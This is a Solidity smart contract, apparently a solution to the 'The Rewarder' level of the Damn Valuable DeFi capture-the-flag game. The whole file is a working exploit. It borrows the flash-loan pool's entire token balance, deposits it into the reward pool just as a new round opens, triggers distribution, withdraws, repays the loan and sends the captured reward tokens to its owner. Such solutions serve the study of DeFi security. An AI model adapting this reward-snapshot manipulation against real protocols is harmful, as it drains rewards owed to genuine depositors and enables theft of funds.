// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TheRewarderPool.sol';
import './RewardToken.sol';
import './FlashLoanerPool.sol';
import '../DamnValuableToken.sol';

/**
 * @title RewardDrainer
 * @author Patate

 */
contract RewardDrainer {
    address public immutable owner;
    TheRewarderPool public immutable theRewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;

    constructor(TheRewarderPool _theRewarderPool, FlashLoanerPool _flashLoanerPool) {
        owner = msg.sender;
        theRewarderPool = _theRewarderPool;
        flashLoanerPool = _flashLoanerPool;
        liquidityToken = _flashLoanerPool.liquidityToken();
    }

    function drain() external {
        require(theRewarderPool.isNewRewardsRound(), 'Reward round not ready');
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanerPool), _amount);

        RewardToken rewardToken = theRewarderPool.rewardToken();
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
